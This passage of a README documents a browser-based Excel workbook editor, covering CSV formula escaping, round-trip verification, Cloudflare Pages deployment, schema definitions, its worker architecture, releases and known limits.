show it as text. Numbers such as `-5`, `+5` or `-$1,234.50` hold nothing to
run and are left alone. The price is that such text reads back with the
apostrophe (`'=A1`), in Excel and in this editor alike. A host that hands
the CSV to another program, not to people, can turn this off with
`escapeFormulas: false`.

Opening is protected the other way round: nothing in a CSV file becomes a
formula here, though Excel would make it one.

## Checking it on real files

`npm run build:verify` builds a checker that round-trips workbooks through
the editor and reports what, if anything, was lost:

```
node dist-verify/verify.js path/to/workbooks --out verify-out --structure
```

For each .xlsx/.xlsm it checks that saving without edits gives back the same
bytes; edits a few cells in a copy and checks they read back, that every other
cell and formula is unchanged, and that charts, pivots, pictures and every
other part are byte for byte the same; has openpyxl read the edits when a
Python with it is available (an independent reader); reports how many of the
file's formulas the engine calculates exactly as Excel saved them, listing
the ones it doesn't; and with `--structure` inserts a row and checks every
reference still works. `verify-out/` gets the edited copies, `report.md` and
`report.json`. The report ends with the one step that needs desktop Excel:
opening the copies there.

`npm run validate:saves` (after `npm run build:verify`; needs the .NET SDK)
checks that saving never makes a workbook invalid. It saves edited copies of
the samples and of the workbooks in `tests/corpus` (made by
`scripts/gen_corpus.py`, `scripts/gen_charts.py` and `scripts/gen_outline.py`
with XlsxWriter: a protected form with unlocked input cells, an Excel table
with structured references, dynamic arrays, LET and LAMBDA, the 1904 date
system, one chart of each kind, rows and columns grouped two levels deep),
validates them with Microsoft's Open XML
SDK (`tools/ooxml-validate`), and fails on any error a copy has that its
original didn't. CI runs it.

Calculation accuracy is also tested with a catalogue of 117 formulas and the
results Excel gives (`tests/calc-accuracy.test.ts`), and function by function
with workbooks Excel grades (`npm run excel:check`, under the calculation
engine above).

## Sharing it on Cloudflare Pages

Everything is static (it all runs in the browser), so each example is its
own Cloudflare Pages site:

| Site | What it is | Pages project | Config |
| --- | --- | --- | --- |
| Demo | The editor with the sample workbooks | `workbook-editor-poc` | `wrangler.jsonc` |
| Portal | The editor embedded in a React supplier portal | `workbook-editor-portal` | `sites/portal/wrangler.jsonc` |
| Angular | The editor embedded in an Angular app | `workbook-editor-angular` | `sites/angular/wrangler.jsonc` |

Once, create each project (each prints its `*.pages.dev` address):

```bash
npx wrangler pages project create workbook-editor-poc --production-branch main
```

```bash
npx wrangler pages project create workbook-editor-portal --production-branch main
```

```bash
npx wrangler pages project create workbook-editor-angular --production-branch main
```

Then, each time you want to publish the current code, build and upload one
site, or all three with `npm run deploy`:

```bash
npm run deploy:demo
```

```bash
npm run deploy:portal
```

```bash
npm run deploy:angular
```

`npm run build:sites` builds them into `dist-sites/` without uploading
anything (`node scripts/build-sites.mjs portal` builds one). The sites link to
each other at `https://<project>.pages.dev/`; if Cloudflare gives a project
another address, or you use custom domains, set `DEMO_URL`, `PORTAL_URL` or
`ANGULAR_URL` when building. Angular's CLI needs Node 22.22.3 or later, so
switch to it before deploying the Angular site or all three (with fnm,
`fnm use 22.23`); with an older Node, `npm run deploy` stops after the demo
and the portal.

To check a site locally the way Pages serves it, build it, then:

```bash
npx wrangler pages dev --port 8788
```

(`--cwd sites/portal` or `--cwd sites/angular` for the others;
`npm run pages:dev` builds and serves the demo.) `public/_headers` keeps the
sites out of search results; anyone with an address can open them, so put
Cloudflare Access in front to restrict that. The demo uploads `big.xlsx` only
if you have generated it locally.

## Schemas

Without a schema the editor is a general spreadsheet. A consumer passes
schemas when it creates the editor (the example app registers the ones in
`src/demo/schemas.ts`):

```ts
const editor = createWorkbookEditor({ schemas: [priceListSchema, budgetSchema] });
```

Each opened workbook is checked against them in order and the first that fits
applies. If none fits, a banner names the closest schema and what didn't line
up (e.g. `Prices!C1 should be "Category" but is "Group"`), and the workbook
opens as a plain spreadsheet.

A schema lists sheets, and on each sheet tables and single cells. A table is
fields × records, and its orientation says which way the records run:

| Table | Fields | Records | Adding and removing |
|---|---|---|---|
| `orientation: 'rows'` | columns, labelled in the first row | rows | rows, up to `records.max` |
| `orientation: 'columns'` | rows, labelled in the first column | columns | columns |
| `records.labels` given | as above | fixed, labelled in the first column (or row) | none: a fixed grid |

```ts
export const priceListSchema = defineSchema({
  id: 'demo.price-list',
  name: 'Price list',
  numbers: { display: 'full', copy: 'raw' },
  sheets: [{
    name: 'Prices',
    tables: [{
      key: 'prices', at: 'A1', orientation: 'rows', records: { min: 1, max: 500 },
      fields: [
        { key: 'sku', label: 'SKU', type: 'text', required: true, unique: true, pattern: '^SKU-\\d{4}$',
          validate: async (value, { signal }) => /* call a service */ undefined },
        { key: 'category', label: 'Category', type: 'enum', values: ['Hardware', 'Software', 'Services'] },
        { key: 'price', label: 'Unit price', type: 'number', min: 0, decimals: 2, formula: 'forbid' },
        { key: 'priceIncTax', label: 'Price inc. tax', type: 'number', formula: 'require' },
      ],
    }],
  }],
  onChange: async (ctx) => { /* look things up, then ctx.set(...) other cells */ },
});
```

- **Fields** have a type (`text`, `number`, `integer`, `percent`, `date`,
  `boolean`, `enum`) and optional `required`, `min`/`max`, `decimals`,
  `pattern`, `values`, `unique`, `readOnly`, and `formula: allow | forbid |
  require`. Formula cells are checked on their calculated value.
- **Constraints**: labels fixed by the schema, read-only fields and cells
  outside the schema's tables can't be edited (configurable per sheet).
  Typed and pasted input is stored as the field's type, so `007` in a text
  field stays text and `12` in a percent field means 12%. Enum fields edit with
  a dropdown: Enter, typing or clicking the selected cell opens it, typing
  filters it, and arrow keys and Enter pick a value.
- **Records** can be inserted or deleted from the toolbar, and a new one can be
  started in the empty row (or column) after a table. New records take the
  calculated fields and number formats of the record before them, as in an
  Excel table.
- **Checks** run as you edit: field rules (type, required, bounds, decimals,
  text length, pattern, allowed values, unique), declarative table checks
  (`monotonic`, `firstEquals`, `sum`, and per record `compare`, `requiredIf`
  and `uniqueTogether`), and code hooks at field, table, sheet and workbook
  level. Hooks may be async; results from superseded runs are dropped, and
  pending checks show in the grid and the issues panel. Each async hook has
  `hookTimeoutMs` (default 10 seconds): a slow check is reported and ignored,
  slow business logic changes nothing, and a slow `beforeSave` stops the save.
- **Versions**: a schema with a `version` stamps files it saves (a custom
  document property, `WorkbookSchema = id@version`). A stamped file tries
  that schema first when opened, and says so if it was saved under another
  version.
- **Sheet names**: a schema finds its sheets by name, so while one applies,
  a sheet it checks can only be renamed to a name it still matches (a
  pattern such as `/^Prices/` allows "Prices 2026"), and a sheet it needs
  (not `optional`) can't be deleted; the editor says why. Moving and hiding
  such sheets, and adding others, leave the schema applying. The binding
  never silently switches to another sheet or drops off mid-session, and a
  saved file opens again under the same schema.
- **Business logic**: `onChange` runs after each edit and can write other cells;
  its writes are part of the same undo step. `beforeSave` can stop a save.
  Saving with errors is blocked, or asks first with `saveWithErrors: 'confirm'`.

Everything except the hook functions is JSON, so the **schema designer**
(toolbar → Schemas) can generate a schema from the open workbook (every table
on each sheet, and "Label | value" cells as single cells), edit it in a form or
as JSON, add tables and single cells by selecting them on the sheet, test it
against the workbook, apply it, and export or import `.schema.json` files. Exporting a schema written in code leaves its hooks out.
Columns with an Excel list validation are generated as enum fields with the
list's values. Where a schema enum field and an Excel list cover the same
cell, the schema wins.

## How it works

```
UI thread                                   Web Worker
──────────────────────────────              ─────────────────────────────────────
React + Glide Data Grid (canvas)            WorkbookSession
SheetView: file cells + overlay  ◄─updates─   OoxmlPackage   unzip, keep every part
store: undo/redo, confirm dialogs ─edits──►   sheetScanner   cells + their XML offsets
                                              engine         src/engine, checked
                                                             against Excel's values
                                              writer         patch changed cells only
```

- **Reading** (`src/core/workbook.ts`, `sheetScanner.ts`): the package is
  unzipped and each worksheet's `<sheetData>` is scanned into compact typed
  arrays, recording where every row and cell sits in the original XML.
  Everything else in the package is left untouched.
- **Calculating** (`src/engine`, `session.ts`): the sheets formulas use are
  loaded into the engine, then every formula's result is compared with the
  value Excel saved. Table references (`Orders[Total]`, `[@Qty]`,
  `Orders[[#Totals],[Qty]]`) are handed to the engine as the cells they stand
  for (`src/core/tableRefs.ts`), while the file keeps them as written.
  The engine has no LET either, so a LET is handed to it written out, each
  name replaced by its value (`expandLets` in `src/core/formula.ts`).
  Formulas the engine can't parse or calculate (LAMBDA, spill
  references…) are given Excel's value instead, so formulas that depend on
  them still calculate correctly. The engine sizes an array before working
  it out, from the formula alone (FILTER as large as what it filters,
  SEQUENCE(A1) not at all), so a spilling formula is given to it wrapped in
  a function of the editor's own (`src/core/functions/spill.ts`) that gives
  the result exactly the room it needs and notes the size it turns out to
  have; when that changes, or something in a blocked formula's way is
  cleared, the formula is put in again.
- **Editing** (`session.ts`, `fill.ts`, `input.ts`): typed and pasted text is
  parsed the way Excel parses it (numbers, percentages, currencies, dates,
  formulas), in the user's locale (`3/4/2026` is 4 March in the US and 3 April
  in the UK; `1.234,50 €` is 1234.5 in Germany) and the workbook's date system.
  The formula bar shows dates the way the locale writes them, so an unchanged
  date commits unchanged. Pastes from Excel take each number's exact value
  from the clipboard's HTML rather than the rounded text. Filling continues
  months, quarters and lists as Excel does, and `seriesLine` is the Fill
  Series dialog's arithmetic; the page sends the lists (built from `Intl` in
  `src/state/fillLists.ts`) with each fill, and a schema's read-only cells
  for the worker to leave. Formula references are shifted with
  `@borgar/fx`. New functions get the `_xlfn.` prefix Excel needs in the file.
- **Charts** (`src/core/charts.ts`, `src/state/charts.ts`,
  `src/ui/ChartView.tsx`): the worker reads each chart part (its kind,
  series, the references they plot with the values Excel saved, titles,
  axes, legend and colours). The screen reads the series from its own copy
  of the cells, so a chart follows every edit and recalculation, using the
  saved values only where a reference can't be followed (another workbook,
  several areas), and draws it with Chart.js (MIT). The library loads only
  when a workbook has a chart to draw.
- **Saving** (`src/core/writer.ts`): only the `<c>` elements of changed cells
  are rewritten, plus cached results of formulas the engine recalculated.
  `calcChain.xml` is removed and the workbook is flagged to recalculate on
  open; pivot caches whose source data changed are flagged to refresh on
  open. Typed formulas are stored the way Excel stores them: functions added
  since Excel 2007 with `_xlfn.`, LET and LAMBDA parameters with `_xlpm.`,
  and formulas that can return an array as dynamic array formulas, with the
  `metadata.xml` entry that marks them, the range they spill into as their
  `ref`, and their values in the cells they cover; cells a spill no longer
  reaches are cleared, and one blocked here is saved as #SPILL! in its own
  cell, as Excel saves it. A workbook with no edits is returned byte for byte.

## Measured (MacBook, Chrome)

| Workbook | Open (grid visible) | Recalculating live | Edit + recalc | Save |
|---|---|---|---|---|
| 100,000 rows × 12 columns, 300,000 formulas | 1.2 s | 4.4 s | 0.2–0.3 s | 1.5 s |

The worker holds about 0.8 GB for that file; the UI thread stays under 100 MB.

## Releases

Versions follow semantic versioning, starting at 0.1.0; before 1.0.0, a
minor version may change the API. `CHANGELOG.md` says what changed in each:
add notes under "Unreleased" as you go. Then, from a clean working tree:

```bash
npm run release -- patch
```

(or `minor`, `major`, or a version such as `0.2.0`). It runs the checks CI
runs short of the browser tests, sets the version, moves the Unreleased
notes under it, writes `THIRD-PARTY-NOTICES.md` again, commits, tags
`vX.Y.Z` and packs the package into `releases/`. Nothing is pushed or
published: push the tag and share or publish the tarball yourself. The
package is marked private, so `npm publish` refuses it rather than putting
it on the public registry by mistake.

## Licence

Proprietary; see `LICENSE`. The library builds include open-source
packages, listed with their licence texts in `THIRD-PARTY-NOTICES.md`, which
`npm run notices` writes from the builds and the package ships.

## Known limits

- Saved files have been checked with openpyxl, ExcelJS, Microsoft's Open XML
  SDK validator and this editor, not with Excel itself, and only on workbooks
  made for testing. Open a few saved files in Excel before relying on them,
  especially `pivot.xlsx`, whose pivot table was written by hand because
  ExcelJS can't create one.
- Not drawn: mixed fonts inside a cell. Merges spanning several rows show
  only the top row.
- Charts are drawn without data labels, trendlines, error bars, gradient
  or picture fills, or the fonts and chart-area colours the file sets (they
  follow the editor's theme), and can't be pointed at or edited. 3-D charts
  are drawn flat. Radar, bubble, stock, surface and pie-of-pie charts, and
  Excel's newer kinds (waterfall, treemap, histogram, funnel…) show as
  placeholders.
- Conditional formatting is evaluated in the worker and redrawn after each
  edit: cell-value, formula, text, blank, error, date, top/bottom,
  above-average and duplicate rules, colour scales, data bars and icon sets,
  in priority order with "stop if true". Data bars don't draw a separate
  axis for negative values, icons are simplified drawings, and a sheet's
  rules stop being evaluated past 200,000 formula evaluations.
- Excel files name their built-in table styles without defining them, so
  those are drawn from each style family's pattern in the theme colours:
  close to Excel, not exact. Custom table styles are drawn as defined.
- Glide can freeze columns but not rows, so frozen rows are a second grid
  above the scrolling one. Arrow keys and sideways scrolling carry across;
  a drag or shift-selection can't span the two.
- Inserting or deleting rows and columns, and moving cells with cut and
  paste, rebuild the workbook in the worker: every reference to cells that
  move follows them (formulas on all sheets, names, merges, validation,
  conditional formatting, links, tables, pivot sources, charts, pictures and
  notes), references to deleted cells become #REF!, and changes that would
  split an array formula, a pivot table or a table's header are refused, as in
  Excel. Rows and columns can be inserted and deleted through a dynamic
  array's spill, which spills again afterwards; cutting and pasting part of
  one is refused. Each one rebuilds the calculation engine, which takes a moment on
  large workbooks, and up to 20 can be undone. Cells moved to another sheet
  leave merges and tables behind, so such moves are refused.
- Outlines: Excel's Auto Outline, outline styles and outline settings (where
  summaries go, whether the outline symbols show) aren't offered, and the
  bars show on any sheet with groups; what a file sets is kept and saved.
  Ungrouping or clearing an outline leaves the rows its
  collapsed groups hid hidden, as in Excel. A group whose total row is also
  the total row of a group around it expands with that group, as the file
  marks only the row as collapsed.
- Sorting reorders rows as Excel does (formulas move as if copied; references
  from elsewhere don't follow). A selected range keeps its first row in place
  only when it looks like headings (text over numbers, or bold over plain). Filtering by values is saved as
  Excel saves it, with the rows it hides; in a table it is the table's
  filter. A file's own filter by values can be changed and cleared; one by
  condition, top ten or colour is kept as the file has it.
- Adding, renaming, deleting, moving, hiding and unhiding a sheet rebuild
  the workbook as inserting rows does. A new sheet is named "Sheet" (or
  "Tabelle" in German, following the editor's language) and numbered one
  past the highest such name. Renaming follows the sheet everywhere a name
  can be followed; Excel itself leaves links (hyperlinks) to a renamed sheet
  broken, while here they follow it. References in text, such as
  `INDIRECT("Data!A1")`, are left as written, as in Excel. A deleted sheet's
  names (print areas and titles among them) go, and names pointing at it
  become #REF!; a pivot table whose source sheet was deleted keeps its data
  and isn't refreshed. A sheet with slicers or timelines, or with pivot
  tables or tables they use, can't be deleted. Sheets hidden as "very
  hidden" are never offered for unhiding.
- Notes and comments are edited as plain text: a changed note loses any
  bold, colour or other formatting in its text, and a changed comment its
  @mentions. New comments are by the `user` option's name, as a person with
  no account behind it (Excel's provider "None"), or by "Anonymous" without
  one; only comments by that name count as the user's own, to edit or
  delete. A new note's box is placed beside its cell, hidden, as Excel adds
  one.
- Links: a link's place in the workbook ("Sheet2!A10") isn't changed when
  rows or columns move, as in Excel. Links and notes follow cut cells, to
  another sheet too. Drag-filling doesn't copy links; copying and
  pasting does, replacing the links where it pastes. Only a formula that is
  a HYPERLINK call is a link, not one with HYPERLINK inside it; with live
  recalculation off, only an address the formula writes as text is known.
- Dynamic arrays: a reference to a spill (`A2#`, which Excel saves as
  ANCHORARRAY) isn't calculated, so a formula using one keeps Excel's
  values, locked, as does a file's spill that the engine works out
  differently from Excel. Array formulas entered with Ctrl+Shift+Enter
  can't be entered, changed or cleared here, and data tables keep Excel's
  values. Formulas the file doesn't mark as
  dynamic arrays came from an Excel that worked them out to one value, and
  don't spill here either. A result of more than a million cells isn't given
  room of its own.
- Validation formulas run in the editor's engine, so a rule using a function
  it lacks is treated as passing. OFFSET and INDIRECT are resolved by the
  editor for list sources only.
- Cells are parsed into typed arrays and held in memory, so files much past
  a few million cells would need streaming parsing; the engine for live
  recalculation needs several times more memory than the cells themselves.
- Schema hooks run on the UI thread in the browser; the editor doesn't call
  a server itself. Inserting or deleting schema records
  moves cells within the table, so formulas outside the table that point
  into it are not adjusted (inserting rows from the grid's menu does adjust
  them).
- The generator's guesses are a starting point: tables need a row of typed
  headings, and a "Label | value" pair with a text value only counts when the
  label ends with a colon or the value is calculated.
